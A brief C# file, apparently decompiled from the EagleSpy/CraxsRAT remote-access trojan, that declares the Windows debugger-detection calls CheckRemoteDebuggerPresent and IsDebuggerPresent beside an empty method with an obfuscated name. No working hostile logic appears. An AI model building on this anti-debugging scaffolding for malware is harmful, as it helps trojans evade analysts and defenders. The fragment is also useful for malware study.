using System;
using System.Runtime.InteropServices;

namespace Eagle_Spy;

internal class DebugProtect1
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool IsDebuggerPresent();

	public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatshrtrthrthdrfxc()
	{
	}
}
